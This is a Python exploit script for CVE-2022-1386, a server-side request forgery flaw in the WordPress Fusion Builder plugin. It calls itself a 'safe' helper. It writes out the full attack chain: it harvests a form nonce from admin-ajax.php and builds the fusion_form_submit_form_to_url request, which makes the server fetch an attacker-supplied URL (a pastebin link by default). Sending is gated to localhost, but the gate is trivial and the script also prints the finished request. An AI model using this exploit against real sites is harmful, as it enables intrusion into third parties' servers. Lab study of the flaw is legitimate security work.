#!/usr/bin/env python3
"""
Safe, corrected, non-exploit version of CVE-2022-1386 helper script.

- Does NOT perform SSRF against remote targets by default.
- Builds multipart payloads correctly (bytes) and prints them for inspection.
- Will ONLY send network requests if:
    - environment variable ALLOW_NETWORK == "1"
    - AND the target host is localhost or 127.0.0.1 (safe lab).
- Use this in a local testing/lab environment only.
"""

import binascii
import json
import os
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def display_banner():
    print(
        """
             CVE-2022-1386 - Fusion Builder < 3.6.2 - (SAFE) helper
            ___   ____ ___  ___       ________ ____  _____
           |__ \ / __ \__ \|__ \     <  /__  /( __ )/ ___/
           __/ // / / /_/ /__/ /_____/ / /_ </ __  / __ \ 
         / __// /_/ / __// __/_____/ /___/ / /_/ / /_/ / 
        /____/\____/____/____/    /_//____/\____/\____/  
        """
    )


def encode_multipart_form_data(fields: dict) -> (bytes, str):
    """
    Build a multipart/form-data body (bytes) and return (body_bytes, content_type_header).
    fields: dict of name -> value (both strings).
    """
    boundary = binascii.hexlify(os.urandom(16)).decode("ascii")
    lines = []
    for field, value in fields.items():
        lines.append(f"--{boundary}")
        # No filename provided; this is a simple field
        lines.append(f'Content-Disposition: form-data; name="{field}"')
        lines.append("")
        lines.append(str(value))
    lines.append(f"--{boundary}--")
    body = "\r\n".join(lines) + "\r\n"
    body_bytes = body.encode("utf-8")
    content_type = f"multipart/form-data; boundary={boundary}"
    return body_bytes, content_type


class CVE_2022_1386_Safe:
    def __init__(self, url):
        self.request = None  # PreparedRequest if a request was sent
        self.test_url = "https://pastebin.com/raw/XNBxNyaU"
        self.fusion_id = None
        self.url = self._normalize_url(url)
        self.parsed = urlparse(self.url)
        self.domain = self.parsed.netloc
        self.output_dir = f"output/{self.domain.replace(':','_')}"
        os.makedirs(self.output_dir, exist_ok=True)

    @staticmethod
    def _normalize_url(url: str) -> str:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        return url.rstrip("/")

    def save_fusion_id(self):
        if self.fusion_id:
            with open(os.path.join(self.output_dir, "fusion_id.txt"), "w") as f:
                f.write(self.fusion_id)

    def load_fusion_id(self):
        p = os.path.join(self.output_dir, "fusion_id.txt")
        if os.path.exists(p):
            with open(p, "r") as f:
                self.fusion_id = f.read().strip()
                return self.fusion_id
        return None

    def generate_fusion_id(self, allow_network=False):
        """
        Attempt to get a fusion id by POSTing to /wp-admin/admin-ajax.php.
        By default, network operations are blocked unless allow_network==True AND
        the target host is localhost/127.0.0.1 (safe).
        Returns the fusion_id string or None.
        """
        loaded = self.load_fusion_id()
        if loaded:
            return loaded

        if not allow_network:
            print("[*] Network disabled for generate_fusion_id. Returning None.")
            return None

        headers = {
            "User-Agent": "SafeTester/1.0",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {"action": "fusion_form_update_view"}
        try:
            r = requests.post(self.url + "/wp-admin/admin-ajax.php", headers=headers, data=data, timeout=10, verify=False)
            r.raise_for_status()
            soup = BeautifulSoup(r.text, "html.parser")
            el = soup.find("input", {"name": "fusion-form-nonce-0"})
            if el and el.get("value"):
                self.fusion_id = el["value"].strip()
                self.save_fusion_id()
                return self.fusion_id
            else:
                return None
        except Exception as e:
            print(f"[!] Network request failed: {e}")
            return None

    def build_exploit_payload(self, payload_url: str):
        """
        Build the multipart body and headers for the payload, but DO NOT send.
        Returns (body_bytes, headers_dict).
        """
        fusion_id = self.fusion_id or "FUSION_ID_PLACEHOLDER"
        data = {
            "formData": (
                "email=example%40example.com&fusion_privacy_store_ip_ua=false"
                "&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore"
                f"&fusion-form-nonce-0={fusion_id}&fusion-fields-hold-private-data="
            ),
            "action": "fusion_form_submit_form_to_url",
            "fusion_form_nonce": fusion_id,
            "form_id": "0",
            "post_id": "0",
            "field_labels": '{"email":"Email address"}',
            "hidden_field_names": "[]",
            "fusionAction": payload_url,
            "fusionActionMethod": "GET"
        }
        body, content_type = encode_multipart_form_data(data)
        headers = {
            "User-Agent": "SafeTester/1.0",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": content_type,
        }
        return body, headers

    def print_request_preview(self, payload_url: str):
        body, headers = self.build_exploit_payload(payload_url)
        print("\n--- Prepared Request Preview ---")
        print(f"POST {self.url}/wp-admin/admin-ajax.php HTTP/1.1")
        print(f"Host: {self.domain}")
        for k, v in headers.items():
            print(f"{k}: {v}")
        print()
        # show just the beginning of the body to avoid huge dumps
        sample = body.decode("utf-8", errors="replace")
        print(sample[:2000])
        print("--- End Preview ---\n")

    def send_if_safe(self, payload_url: str, allow_network=False):
        """
        Send the prepared request only if:
          - allow_network is True
          - and the target host is localhost/127.0.0.1
        Otherwise, print the prepared request and return a simulated response dict.
        """
        body, headers = self.build_exploit_payload(payload_url)

        # Safety check: only allow network to localhost if explicitly allowed
        host = self.parsed.hostname
        if not allow_network or host not in ("127.0.0.1", "localhost"):
            print("[*] Network send blocked for safety. Preview provided instead.")
            self.print_request_preview(payload_url)
            return {"status": "blocked", "info": "Network sending is disabled or host is not localhost."}

        # If we reach here, user explicitly allowed network AND target is localhost
        try:
            r = requests.post(self.url + "/wp-admin/admin-ajax.php", headers=headers, data=body, timeout=15, verify=False)
            self.request = r.request
            try:
                return r.json()
            except ValueError:
                return {"status": "success", "raw_text": r.text[:2000]}
        except Exception as e:
            return {"status": "failed", "error": str(e)}

    def save_raw_request(self, filename):
        if not self.request:
            print("[*] No saved request to write.")
            return
        req = self.request
        headers = [f"{k}: {v}" for k, v in req.headers.items()]
        path = os.path.join(self.output_dir, filename)
        with open(path, "wb") as f:
            # method and url
            first_line = f"{req.method} {req.url} HTTP/1.1\r\n"
            f.write(first_line.encode("utf-8"))
            for h in headers:
                f.write((h + "\r\n").encode("utf-8"))
            f.write(b"\r\n")
            # body may be bytes or str
            body = req.body or b""
            if isinstance(body, str):
                body = body.encode("utf-8")
            f.write(body)
        print(f"[+] Raw request saved to {path}")


def is_localhost_host(url: str) -> bool:
    parsed = urlparse(url if url.startswith(("http://", "https://")) else "https://" + url)
    return parsed.hostname in ("127.0.0.1", "localhost")


if __name__ == "__main__":
    display_banner()
    target = input("[>] Target URL (example: https://example.com): ").strip()
    if not target:
        print("No target provided. Exiting.")
        sys.exit(1)

    safe_tool = CVE_2022_1386_Safe(target)

    # Decide whether to allow real network operations:
    allow_network = os.environ.get("ALLOW_NETWORK", "0") == "1"
    if allow_network:
        if not is_localhost_host(target):
            print("[!] ALLOW_NETWORK is set but target host is not localhost/127.0.0.1. For safety network will remain disabled.")
            allow_network = False
        else:
            print("[*] Network sending ENABLED (localhost only).")

    print("[*] Building and previewing payload (no network send by default)...")
    # Example preview against the test URL; no network by default
    safe_tool.print_request_preview(safe_tool.test_url)

    while True:
        payload = input("[>] Payload (enter 'exit' to quit, or leave blank to preview test_url): ").strip()
        if payload.lower() == "exit":
            break
        if payload == "":
            payload = safe_tool.test_url

        # This will either send (if explicitly allowed and localhost) or preview
        result = safe_tool.send_if_safe(payload, allow_network=allow_network)
        print("[*] Result:", json.dumps(result, indent=2))
        # Optionally save raw request if one was actually sent
        if safe_tool.request:
            safe_tool.save_raw_request("raw_request.txt")

